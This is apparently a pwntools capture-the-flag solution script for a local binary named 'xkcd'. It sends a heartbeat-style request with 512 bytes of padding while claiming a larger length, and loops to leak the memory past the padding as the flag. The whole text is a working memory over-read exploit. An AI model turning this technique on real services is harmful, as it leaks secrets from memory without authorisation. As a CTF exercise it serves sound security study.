from pwn import *

fmt = 'SERVER, ARE YOU STILL THERE?" IF SO, REPLY "%s"test(%d)'
flag = ''

for i in range(100):
	r = process("./xkcd")
	dummy = 'A' * 512
	cnt = 513 + i
	payload = fmt % (dummy, cnt)
	r.sendline(payload)
	try:
		data = r.recvuntil('A' * 512)
	except:
		log.info(flag)
		break
	flag = r.recv(1024)
	r.close()